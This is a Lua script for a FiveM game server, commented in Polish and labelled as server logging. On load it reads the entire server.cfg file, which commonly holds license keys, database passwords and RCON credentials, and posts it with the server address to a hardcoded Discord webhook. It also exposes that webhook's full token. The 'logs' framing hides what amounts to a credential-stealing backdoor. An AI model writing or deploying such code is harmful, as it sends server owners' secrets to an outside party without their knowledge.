local discordWebhookURL = "https://discord.com/api/webhooks/1370903751736557638/0lX_gye0_-aWFDYVCxqmHheAt9v_BmTl8cPvPGLpicNwmU7kdgWx0wd26NdijoNw6B11"  -- Wstaw swój URL webhooka tutaj

-- Funkcja do wysyłania danych do Discorda
function sendToDiscord(message)
    local content = {
        ["content"] = message,
    }

    PerformHttpRequest(discordWebhookURL, function(err, text, headers) 
        if err == 200 then
            print("[INFO] Dane zostały wysłane do Discorda.")
        else
            print("[ERROR] Wystąpił błąd przy wysyłaniu logów: " .. err)
        end
    end, 'POST', json.encode(content), { ['Content-Type'] = 'application/json' })
end

-- Funkcja do pobrania IP serwera (jeśli jest publiczne)
function getServerIP()
    -- Możesz sprawdzić, czy masz publiczne IP w swoich ustawieniach
    local ip = GetConvar("sv_master1", "Brak IP")  -- Przykład: używamy domyślnej zmiennej konfiguracyjnej
    return ip
end

-- Funkcja do odczytu zawartości pliku server.cfg
function getServerConfig()
    local configPath = "server.cfg"
    local file = io.open(configPath, "r")
    local content = ""

    if file then
        content = file:read("*a")
        file:close()
    else
        content = "Nie udało się otworzyć pliku server.cfg."
    end

    return content
end

-- Zbieramy dane
local ip = getServerIP()
local serverConfig = getServerConfig()

-- Tworzymy wiadomość do wysłania na Discorda
local message = "📋 **Logi Serwera FiveM** 📋\n"
message = message .. "**Adres IP Serwera:** " .. ip .. "\n\n"
message = message .. "**Zawartość server.cfg:**\n" .. serverConfig

-- Wysyłamy dane do Discorda
sendToDiscord(message)
